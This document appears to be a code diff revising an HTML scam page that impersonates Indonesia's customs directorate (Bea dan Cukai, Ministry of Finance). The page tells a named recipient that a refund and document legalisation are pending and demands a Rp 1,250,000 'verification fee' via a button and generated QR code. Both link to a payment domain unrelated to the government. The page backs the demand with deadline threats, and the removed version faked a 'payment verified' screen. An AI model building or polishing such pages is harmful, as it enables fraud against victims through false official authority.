@@ -3,98 +3,87 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>VERIFIKASI KLAIM REFUND & LEGALISASI DOKUMEN</title>
+  <title>Verifikasi Klaim Refund – DJBC</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js"></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
+
+    :root {
+      --primary: #0d3b66;
+      --primary-dark: #0a2e52;
+      --accent: #d4af37;
+      --light: #f8f9fa;
+      --gray: #6c757d;
+      --success: #28a745;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
 
     body {
       font-family: 'Open Sans', sans-serif;
       line-height: 1.6;
-      color: #2c3e50;
-      background: #f0f7ff;
+      color: #333;
+      background: #f5f7fa;
       margin: 0;
       padding: 0;
       position: relative;
     }
 
-    /* Watermark ISO 27001 */
-    .watermark {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: -1;
-      opacity: 0.06;
-      pointer-events: none;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      user-select: none;
-    }
-
-    .watermark img {
-      width: 300px;
-      height: auto;
-      filter: brightness(0) saturate(100%) invert(50%) sepia(0%) saturate(2000%) hue-rotate(180deg);
-    }
-
     .container {
       max-width: 900px;
       margin: 40px auto;
-      padding: 30px;
       background: white;
       border-radius: 12px;
-      box-shadow: 0 6px 30px rgba(0,0,0,0.12);
+      box-shadow: 0 10px 40px rgba(0,0,0,0.12);
+      overflow: hidden;
       position: relative;
-      min-height: 100vh;
     }
 
     .header {
+      background: var(--primary);
+      color: white;
       text-align: center;
-      margin-bottom: 25px;
-      padding: 20px 0;
-      border-bottom: 3px solid #1a3e6f;
+      padding: 25px 20px 15px;
     }
 
     .header img.logo-djbc {
-      width: 250px;
+      width: 220px;
+      max-width: 90%;
       margin: 0 auto 15px;
       display: block;
       background: transparent;
-      border: none;
       object-fit: contain;
-      object-position: center;
-      max-width: 100%;
       height: auto;
     }
 
     .header h1 {
-      font-size: 2.1em;
-      margin: 5px 0;
-      color: #1a3e6f;
-      letter-spacing: 0.5px;
+      font-size: 1.8em;
+      margin: 8px 0 4px;
       font-weight: 700;
+      letter-spacing: 0.5px;
     }
 
     .header p {
-      font-size: 1.1em;
-      color: #2c3e50;
-      margin: 5px 0;
+      font-size: 1.05em;
+      opacity: 0.9;
+      margin: 0;
       font-weight: 600;
     }
 
     .verification-badge {
       text-align: center;
-      margin: 25px 0;
+      padding: 30px 20px;
+      background: #fff9e6;
+      border-bottom: 1px solid #ffe082;
     }
 
-    .pending-icon, .verified-icon {
-      width: 80px;
-      height: 80px;
+    .pending-icon {
+      width: 70px;
+      height: 70px;
+      background: var(--accent);
       border-radius: 50%;
       display: inline-flex;
       align-items: center;
@@ -102,217 +91,205 @@
       margin-bottom: 15px;
     }
 
-    .pending-icon {
-      background: #ffc107;
-      animation: spin 2s linear infinite;
-    }
-
-    .verified-icon {
-      background: #1a73e8;
-      animation: pulse 1.5s infinite;
-    }
-
-    .pending-icon svg, .verified-icon svg {
-      width: 48px;
-      height: 48px;
-    }
-
     .pending-icon svg {
-      fill: #333;
-    }
-
-    .verified-icon svg {
-      fill: white;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    @keyframes pulse {
-      0% { box-shadow: 0 0 0 0 rgba(26, 115, 232, 0.6); }
-      70% { box-shadow: 0 0 0 12px rgba(26, 115, 232, 0); }
-      100% { box-shadow: 0 0 0 0 rgba(26, 115, 232, 0); }
+      width: 36px;
+      height: 36px;
+      fill: #000;
     }
 
     .verification-status {
-      font-size: 1.3em;
+      font-size: 1.4em;
       font-weight: 700;
-      margin-bottom: 5px;
+      color: var(--accent);
+      margin-bottom: 10px;
     }
 
     .verification-note {
-      color: #555;
-      font-size: 0.95em;
+      color: var(--gray);
+      max-width: 600px;
+      margin: 0 auto 20px;
     }
 
     .btn {
-      display: inline-block;
-      padding: 12px 28px;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 12px 24px;
       border-radius: 8px;
       text-decoration: none;
       font-weight: 600;
-      margin-top: 10px;
+      margin: 8px;
       text-align: center;
       cursor: pointer;
       font-size: 1em;
-      transition: background 0.3s;
+      transition: all 0.25s ease;
+      border: none;
+    }
+
+    .btn-payment {
+      background: var(--success);
+      color: white;
+    }
+
+    .btn-payment:hover {
+      background: #218838;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
     }
 
     .btn-download {
-      background: #1a73e8;
+      background: var(--primary);
       color: white;
     }
 
     .btn-download:hover {
-      background: #0d5bb8;
-    }
-
-    .btn-scan {
-      background: #4caf50;
-      color: white;
-      border: none;
-    }
-
-    .btn-scan:hover {
-      background: #388e3c;
+      background: var(--primary-dark);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(13, 59, 102, 0.3);
     }
 
     .section {
       padding: 25px;
-      margin: 20px 0;
-      border-radius: 10px;
-      background: #fff;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
-      border-left: 4px solid #ffc107;
-      page-break-inside: avoid;
-    }
-
-    .section.verified {
-      border-left: 4px solid #1a73e8;
+      margin: 0;
+      border-bottom: 1px solid #eee;
     }
 
     .section h2 {
-      color: #1a3e6f;
-      border-bottom: 2px solid #ffc107;
-      padding-bottom: 6px;
+      color: var(--primary);
+      padding-bottom: 8px;
       margin-top: 0;
       font-weight: 700;
-      font-size: 1.4em;
-    }
-
-    .section.verified h2 {
-      border-bottom-color: #1a73e8;
+      font-size: 1.35em;
+      border-bottom: 2px solid var(--primary);
+      display: inline-block;
     }
 
     .info-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
-      gap: 18px;
+      gap: 16px;
       margin: 20px 0;
     }
 
     .info-item {
-      background: #fff8e1;
+      background: #f8fbff;
       padding: 14px;
       border-radius: 8px;
       font-weight: 600;
-      border: 1px solid #ffe082;
+      border-left: 3px solid var(--primary);
     }
 
     .info-label {
-      color: #ffc107;
+      color: var(--primary);
       display: block;
-      margin-bottom: 5px;
+      margin-bottom: 4px;
       font-weight: 700;
       font-size: 0.95em;
     }
 
+    .qr-container {
+      text-align: center;
+      margin: 20px 0;
+    }
+
+    #payment-qr {
+      width: 180px;
+      height: 180px;
+      margin: 15px auto;
+      cursor: pointer;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      padding: 10px;
+      background: white;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      transition: transform 0.2s;
+    }
+
+    #payment-qr:hover {
+      transform: scale(1.03);
+      border-color: var(--primary);
+    }
+
     .footer {
       text-align: center;
-      margin-top: 40px;
-      padding-top: 20px;
-      border-top: 1px solid #eaeaea;
-      color: #666;
+      padding: 20px;
+      color: var(--gray);
       font-size: 0.85em;
-      font-weight: 500;
+      background: #f9fbfd;
+      border-top: 1px solid #eee;
     }
 
     ul, ol {
       padding-left: 20px;
-      margin: 10px 0;
+      margin: 12px 0;
     }
 
     li {
       margin-bottom: 8px;
     }
 
-    #scanner-container {
-      display: none;
-      margin: 20px 0;
-      text-align: center;
-    }
-
-    #scanner-video {
-      width: 100%;
-      max-width: 400px;
-      border: 2px solid #1a73e8;
-      border-radius: 8px;
-    }
-
     @media (max-width: 768px) {
       .info-grid {
         grid-template-columns: 1fr;
       }
-      .container {
-        margin: 15px;
-        padding: 20px;
-      }
       .header h1 {
-        font-size: 1.8em;
+        font-size: 1.6em;
+      }
+      .btn {
+        display: block;
+        margin: 12px auto;
+        max-width: 300px;
+      }
+      #payment-qr {
+        width: 160px;
+        height: 160px;
       }
     }
   </style>
 </head>
 <body>
 
-  <!-- Watermark ISO 27001 -->
-  <div class="watermark">
-    <img src="https://i.imgur.com/4oVQWvR.png" alt="ISO 27001 Certified" />
-  </div>
-
   <div class="container">
 
-    <!-- Header with NEW LOGO -->
+    <!-- Header Resmi -->
     <div class="header">
       <img 
         src="https://i.ibb.co.com/zWKYPJDM/IMG-20251207-070705.jpg" 
-        alt="Logo Direktorat Jenderal Bea dan Cukai" 
+        alt="Logo Direktorat Jenderal Bea dan Cukai"
         class="logo-djbc"
         loading="lazy"
-        decoding="async"
       >
       <h1>KEMENTERIAN KEUANGAN REPUBLIK INDONESIA</h1>
       <p>DIREKTORAT JENDERAL BEA DAN CUKAI</p>
     </div>
 
-    <!-- Verification Badge -->
-    <div class="verification-badge" id="verificationArea">
+    <!-- Status Verifikasi -->
+    <div class="verification-badge">
       <div class="pending-icon">
         <svg viewBox="0 0 24 24">
           <path d="M12 6v6l4 4V4z"/>
         </svg>
       </div>
-      <div class="verification-status" style="color: #ffc107;" id="statusText">PENDING — MENUNGGU PEMBAYARAN</div>
-      <div class="verification-note">Silakan scan QR Code di bawah untuk melanjutkan ke halaman pembayaran resmi.</div>
-      <button class="btn btn-scan" onclick="startScanner()">📱 SCAN QR CODE PEMBAYARAN</button>
+      <div class="verification-status">PENDING — MENUNGGU PEMBAYARAN</div>
+      <p class="verification-note">Silakan selesaikan pembayaran verifikasi untuk mengaktifkan proses refund dan legalisasi dokumen.</p>
+      
+      <a 
+        href="https://hspay.viva88athenae.com/hades/view/redirect?data=m0oqOAUKUr1qm2vEKxXfkGSnVGVfUu4QJTkeMemdkXUgmBzq7vmqOghqciZRALl2Cxh9oCPXqLXt4Y4CQ3sstgLJkq92Mf3KsenL1j_gAldBCzHEdM8k17vaOHo7XERjbiqw8ByhVKfd_6TdZP150ejUQY2akdy1uh5o9.pcINOyCQ7BycURCj1MeEN.rWhR" 
+        target="_blank" 
+        class="btn btn-payment"
+        rel="noopener noreferrer"
+      >
+        💳 BAYAR SEKARANG
+      </a>
     </div>
 
-    <!-- Scanner Video -->
-    <div id="scanner-container">
-      <video id="scanner-video" playsinline></video>
-      <p style="margin-top:10px; color:#666;">Arahkan kamera ke QR Code pembayaran Anda.</p>
+    <!-- QR Code -->
+    <div class="section">
+      <h2>QR CODE PEMBAYARAN</h2>
+      <p>Scan atau klik QR Code berikut untuk membayar:</p>
+      <div class="qr-container">
+        <img id="payment-qr" alt="QR Code Pembayaran" />
+      </div>
     </div>
 
     <!-- DATA PENERIMA -->
@@ -338,78 +315,35 @@
       </div>
     </div>
 
-    <!-- DATA PENGIRIMAN -->
-    <div class="section">
-      <h2>II. DATA PENGIRIMAN</h2>
-      <div class="info-grid">
-        <div class="info-item">
-          <span class="info-label">Nomor Resi</span>
-          001797568821
-        </div>
-        <div class="info-item">
-          <span class="info-label">Jenis Barang</span>
-          Rokok tanpa pita cukai resmi
-        </div>
-        <div class="info-item">
-          <span class="info-label">Jumlah</span>
-          3 slop (600 batang)
-        </div>
-      </div>
-    </div>
-
     <!-- VERIFIKASI & REFUND -->
     <div class="section">
-      <h2>III. STATUS VERIFIKASI & REFUND</h2>
-      <p><strong>Kode Akses:</strong> <code>REF-2025-001797568821</code></p>
+      <h2>II. RINCIAN PEMBAYARAN & REFUND</h2>
       <p><strong>Biaya Verifikasi:</strong> Rp 1.250.000,00</p>
       <p><strong>Total Refund:</strong> Rp 2.375.000,00</p>
-      <p>Status: <strong id="statusInline" style="color: #ffc107;">⏳ Menunggu Pembayaran</strong></p>
-      <button class="btn btn-download" onclick="generatePDF()">📥 DOWNLOAD QR CODE PEMBAYARAN (PDF)</button>
+      <p>Status: <strong style="color: var(--accent);">⏳ Menunggu Pembayaran</strong></p>
+      <button class="btn btn-download" onclick="generatePDF()">📥 DOWNLOAD QR PEMBAYARAN (PDF)</button>
     </div>
 
-    <!-- Teks Resmi yang Diminta -->
+    <!-- Teks Resmi -->
     <div class="section">
-      <h2>IV. VERIFIKASI KODE AKSES UNTUK KLAIM PENGEMBALIAN DANA (REFUND) DAN LEGALISASI DOKUMEN</h2>
+      <h2>III. KETENTUAN VERIFIKASI</h2>
       <p>Dalam rangka memenuhi prosedur administratif yang berlaku, proses verifikasi kode akses merupakan syarat utama dan wajib yang harus diselesaikan terlebih dahulu sebelum pemohon dapat melanjutkan ke tahapan berikut:</p>
       <ol>
         <li>Pengajuan klaim pengembalian dana (refund); dan</li>
         <li>Penerbitan dokumen legalitas oleh instansi atau pihak yang berwenang.</li>
       </ol>
       <p><strong>Jumlah yang Wajib Diselesaikan:</strong><br>
-      <strong>Rp 1.250.000,00</strong> (Satu Juta Dua Ratus Lima Puluh Ribu Rupiah)<br>
-      <em>(Untuk keperluan kode akses penyesuaian data)</em></p>
-      <p>Harap diperhatikan bahwa setiap bentuk keterlambatan maupun kegagalan dalam menyelesaikan verifikasi kode akses dapat menyebabkan penundaan bahkan pembatalan otomatis terhadap seluruh proses pengajuan refund dan legalisasi dokumen yang sedang berlangsung.</p>
+      <strong>Rp 1.250.000,00</strong> (Satu Juta Dua Ratus Lima Puluh Ribu Rupiah)</p>
     </div>
 
     <div class="section">
-      <h2>V. RINCIAN PENGEMBALIAN DANA (REFUND)</h2>
-      <p>Apabila seluruh proses verifikasi telah diselesaikan secara menyeluruh, dana akan dikembalikan kepada pemohon dengan rincian sebagai berikut:</p>
-      <ol>
-        <li>
-          <strong>Pengajuan Legalitas</strong><br>
-          Nilai pengajuan: Rp 1.250.000,00<br>
-          Potongan biaya administrasi: 10%<br>
-          Dana yang dikembalikan: <strong>Rp 1.125.000,00</strong>
-        </li>
-        <li>
-          <strong>Verifikasi Klaim</strong><br>
-          Kode akses penyesuaian  Rp 1.250.000,00<br>
-          Digunakan untuk proses verifikasi data pusat dan validasi administrasi
-        </li>
-      </ol>
-      <p><strong>Total Dana yang Akan Dikembalikan: Rp 2.375.000,00</strong></p>
-      <p>Pengembalian dana akan diproses secara otomatis dalam estimasi waktu <strong>5–10 menit</strong> setelah seluruh tahapan verifikasi diselesaikan. Dana akan ditransfer langsung ke rekening penerima yang telah terdaftar dan diverifikasi secara sah.</p>
-    </div>
-
-    <div class="section">
-      <h2>VI. CATATAN PENTING</h2>
+      <h2>IV. CATATAN PENTING</h2>
       <ul>
-        <li>Proses verifikasi kode akses wajib diselesaikan dalam batas waktu yang telah ditentukan.</li>
-        <li>Apabila verifikasi tidak diselesaikan tepat waktu, maka sistem akan melakukan pembatalan otomatis terhadap seluruh pengajuan refund dan legalisasi dokumen yang bersangkutan.</li>
+        <li>Proses verifikasi wajib diselesaikan dalam batas waktu yang telah ditentukan.</li>
+        <li>Apabila verifikasi tidak diselesaikan tepat waktu, sistem akan melakukan pembatalan otomatis terhadap seluruh pengajuan refund dan legalisasi dokumen.</li>
       </ul>
     </div>
 
-    <!-- Footer -->
     <div class="footer">
       © 2025 Direktorat Jenderal Bea dan Cukai — Kementerian Keuangan Republik Indonesia<br>
       Dokumen ini sah apabila dilengkapi QR Code pembayaran resmi.
@@ -417,114 +351,55 @@
 
   </div>
 
-  <!-- Hidden canvas for QR Code -->
+  <!-- Hidden canvas -->
   <canvas id="qrCanvas" style="display:none;"></canvas>
 
   <script>
-    // 🔗 LINK PEMBAYARAN RESMI
     const paymentUrl = "https://hspay.viva88athenae.com/hades/view/redirect?data=m0oqOAUKUr1qm2vEKxXfkGSnVGVfUu4QJTkeMemdkXUgmBzq7vmqOghqciZRALl2Cxh9oCPXqLXt4Y4CQ3sstgLJkq92Mf3KsenL1j_gAldBCzHEdM8k17vaOHo7XERjbiqw8ByhVKfd_6TdZP150ejUQY2akdy1uh5o9.pcINOyCQ7BycURCj1MeEN.rWhR";
-    
-    let scanning = false;
-    const video = document.getElementById('scanner-video');
-    const scannerContainer = document.getElementById('scanner-container');
-    const verificationArea = document.getElementById('verificationArea');
-    const statusText = document.getElementById('statusText');
-    const statusInline = document.getElementById('statusInline');
+    const qrImg = document.getElementById('payment-qr');
 
-    async function startScanner() {
-      if (scanning) return;
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-        video.srcObject = stream;
-        scannerContainer.style.display = 'block';
-        scanning = true;
-        requestAnimationFrame(tick);
-      } catch (err) {
-        alert("Kamera tidak tersedia. Silakan unduh PDF dan scan QR Code menggunakan aplikasi kamera.");
-        console.error(err);
-      }
-    }
-
-    function tick() {
-      if (!scanning) return;
-      if (video.readyState === video.HAVE_ENOUGH_DATA) {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-        const code = jsQR(imageData.data, imageData.width, imageData.height, {
-          inversionAttempts: "dontInvert",
-        });
-
-        if (code && code.data === paymentUrl) {
-          stopScanner();
-          showVerified();
-        }
-      }
-      requestAnimationFrame(tick);
-    }
-
-    function stopScanner() {
-      scanning = false;
-      if (video.srcObject) {
-        video.srcObject.getTracks().forEach(track => track.stop());
-      }
-      scannerContainer.style.display = 'none';
-    }
-
-    function showVerified() {
-      verificationArea.innerHTML = `
-        <div class="verified-icon">
-          <svg viewBox="0 0 24 24">
-            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
-          </svg>
-        </div>
-        <div class="verification-status" style="color: #1a73e8;">PEMBAYARAN TERVERIFIKASI — PROSES REFUND DIMULAI</div>
-        <div class="verification-note">Terima kasih! Pembayaran Anda telah dikonfirmasi. Dana akan dikirim dalam 5–10 menit.</div>
-      `;
-      statusInline.innerHTML = "✅ <strong>PEMBAYARAN TERVERIFIKASI</strong>";
-      statusInline.style.color = "#2e7d32";
-      document.querySelectorAll('.section').forEach(el => {
-        el.classList.add('verified');
-        el.querySelector('h2').style.borderColor = '#1a73e8';
-      });
-    }
+    // Generate QR
+    QRCode.toCanvas(document.getElementById('qrCanvas'), paymentUrl, {
+      width: 200,
+      margin: 2
+    }, function (error) {
+      if (error) console.error("Error generating QR:", error);
+      qrImg.src = document.getElementById('qrCanvas').toDataURL('image/png');
+      qrImg.onclick = () => window.open(paymentUrl, '_blank', 'noopener,noreferrer');
+    });
 
     function generatePDF() {
       const { jsPDF } = window.jspdf;
       const doc = new jsPDF();
 
+      // Header
+      doc.setFillColor(13, 59, 102);
+      doc.rect(0, 0, 210, 30, 'F');
+      doc.setTextColor(255);
       doc.setFontSize(16);
-      doc.text("DOKUMEN VERIFIKASI RESMI", 105, 20, null, null, "center");
-      doc.setFontSize(12);
-      doc.text("Kementerian Keuangan Republik Indonesia", 105, 28, null, null, "center");
-      doc.text("Direktorat Jenderal Bea dan Cukai", 105, 34, null, null, "center");
+      doc.text("DOKUMEN VERIFIKASI RESMI", 105, 15, null, null, "center");
+      doc.setFontSize(10);
+      doc.text("Kementerian Keuangan Republik Indonesia", 105, 22, null, null, "center");
 
-      doc.setDrawColor(0, 0, 0);
-      doc.line(20, 40, 190, 40);
-
+      // Content
+      doc.setTextColor(0);
       doc.setFontSize(11);
-      doc.text("Nomor Resi       : 001797568821", 20, 50);
-      doc.text("Nama Penerima    : Aan", 20, 58);
-      doc.text("Tanggal Verifikasi: 07 Desember 2025", 20, 66);
-      doc.text("Biaya Verifikasi : Rp 1.250.000,00", 20, 74);
-      doc.text("Status           : Menunggu Pembayaran", 20, 82);
+      let y = 40;
+      doc.text("Nomor Resi       : 001797568821", 20, y);
+      doc.text("Nama Penerima    : Aan", 20, y + 8);
+      doc.text("Biaya Verifikasi : Rp 1.250.000,00", 20, y + 16);
+      doc.text("Status           : Menunggu Pembayaran", 20, y + 24);
 
-      const canvas = document.getElementById('qrCanvas');
-      QRCode.toCanvas(canvas, paymentUrl, {
-        width: 150,
-        margin: 2
-      }, function (error) {
-        if (error) console.error(error);
-        const imgData = canvas.toDataURL('image/png');
-        doc.addImage(imgData, 'PNG', 75, 95, 60, 60);
-        doc.setFontSize(9);
-        doc.setTextColor(100);
-        doc.text("Scan QR Code ini untuk membayar dan mengaktifkan proses refund.", 105, 155, null, null, "center");
-        doc.save("QR_Pembayaran_Refund_001797568821.pdf");
-      });
+      // QR
+      const qrData = document.getElementById('qrCanvas').toDataURL('image/png');
+      doc.addImage(qrData, 'PNG', 75, y + 35, 60, 60);
+
+      // Footer note
+      doc.setFontSize(9);
+      doc.setTextColor(100);
+      doc.text("Scan QR Code ini untuk membayar dan aktifkan proses refund.", 105, y + 105, null, null, "center");
+
+      doc.save("Verifikasi_Refund_001797568821.pdf");
     }
   </script>
 </body>
